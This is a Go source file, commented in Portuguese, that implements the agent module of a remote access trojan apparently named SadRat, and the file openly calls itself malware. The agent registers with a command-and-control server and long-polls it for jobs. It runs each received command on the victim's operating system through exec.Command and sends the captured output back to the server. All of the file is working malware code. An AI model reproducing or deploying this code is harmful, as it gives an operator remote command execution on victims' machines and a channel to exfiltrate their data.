package agent

import (
	"bytes"
	"encoding/json"
	"errors"
	"net/http"
	"os/exec"
	"time"
	"github.com/VitorDie/SadRat/internal/dto"
)

// AgentHTTP é o módulo cliente do nosso Malware
type AgentHTTP struct {
	serverURL  string
	httpClient *http.Client
}

// NewAgentHTTP cria uma nova instância do Agente zumbi
func NewAgentHTTP(serverURL string) *AgentHTTP {
	return &AgentHTTP{
		serverURL: serverURL,
		// Regra de Ouro: Sempre usar timeout para evitar que o malware trave a thread!
		httpClient: &http.Client{Timeout: 10 * time.Second},
	}
}

// type Job struct {
// 	ID      string   `json:"id"`
// 	Command string   `json:"command"`
// 	Args    []string `json:"args"`
// }

// RequestAnUUIDToMe bate na porta do C&C pedindo uma identidade
func (a *AgentHTTP) RequestAnUUIDToMe() (string, error) {
	// 1. Monta a URL da rota que já construímos no Servidor
	url := a.serverURL + "/api/agents"

	// 2. Prepara a requisição POST (o corpo pode ser vazio)
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer([]byte{}))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")

	// 3. O Agente executa o disparo para a rede
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// 4. Se o servidor não responder com 201 Created (ou 200 OK), algo deu errado
	if resp.StatusCode != http.StatusCreated && resp.StatusCode != http.StatusOK {
		return "", errors.New("falha ao registrar o agente no C&C, status: " + resp.Status)
	}

	// 5. Lemos a resposta JSON enviada pelo nosso C&C
	var result map[string]string
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return "", err
	}

	// 6. Extraímos o UUID gerado
	uuid, ok := result["uuid"]
	if !ok {
		return "", errors.New("o C&C não retornou um UUID válido")
	}

	return uuid, nil
}

// RequestJob faz o Long Polling perguntando ao C&C: "Mestre, o que devo fazer?"
func (a *AgentHTTP) RequestJob(agentID string) (dto.JobUsedByAgentDTO, error) {
	// 1. Monta a URL exata do Operador
	url := a.serverURL + "/api/agents/" + agentID + "/job"

	// 2. Prepara a requisição GET (Long Polling usa GET)
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return dto.JobUsedByAgentDTO{}, err
	}

	// 3. O Agente dispara a requisição e aguarda (pacientemente)
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return dto.JobUsedByAgentDTO{}, err
	}
	defer resp.Body.Close()

	// 4. Se o servidor retornou 204 No Content (Sem Comandos), ou algum erro
	if resp.StatusCode != http.StatusOK {
		return dto.JobUsedByAgentDTO{}, errors.New("nenhum comando recebido ou falha no servidor")
	}

	// 5. O C&C devolveu 200 OK! Vamos ler qual comando devemos executar
	var job dto.JobUsedByAgentDTO
	if err := json.NewDecoder(resp.Body).Decode(&job); err != nil {
		return dto.JobUsedByAgentDTO{}, err
	}

	return job, nil
}

// ExecuteJob invoca o Sistema Operacional da vítima para rodar o comando e capturar a saída
func (a *AgentHTTP) ExecuteJob(job dto.JobUsedByAgentDTO) (string, error) {
	// 1. Preparamos o comando para o Sistema Operacional usando os/exec
	cmd := exec.Command(job.Command, job.Args...)

	// 2. Executamos o comando e capturamos a saída padrão (stdout e stderr combinados)
	output, err := cmd.CombinedOutput()
	
	if err != nil {
		// Se o comando falhar (ex: comando não existe), devolvemos o erro junto com o que o terminal cuspiu
		return string(output) + "\n" + err.Error(), err
	}

	// 3. Devolvemos a string limpa do terminal para ser enviada de volta ao C&C
	return string(output), nil
}

func (a *AgentHTTP) SendJobResult(jobID string, output string) error {
	// 1. Monta a URL da rota de resultados do Operador
	url := a.serverURL + "/api/jobs/result"

	// 2. Prepara o DTO (JSON) exatamente como o Servidor espera receber
	payload := map[string]string{
		"job_id": jobID,
		"output": output,
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	// 3. Prepara a requisição POST com o JSON embutido
	req, err := http.NewRequest(http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", "application/json")

	// 4. O Agente dispara a requisição para o C&C relatando o sucesso
	resp, err := a.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// 5. Valida se o servidor processou e aceitou o relatório
	if resp.StatusCode != http.StatusOK {
		return errors.New("falha ao enviar resultado para o C&C, status: " + resp.Status)
	}

	return nil
}
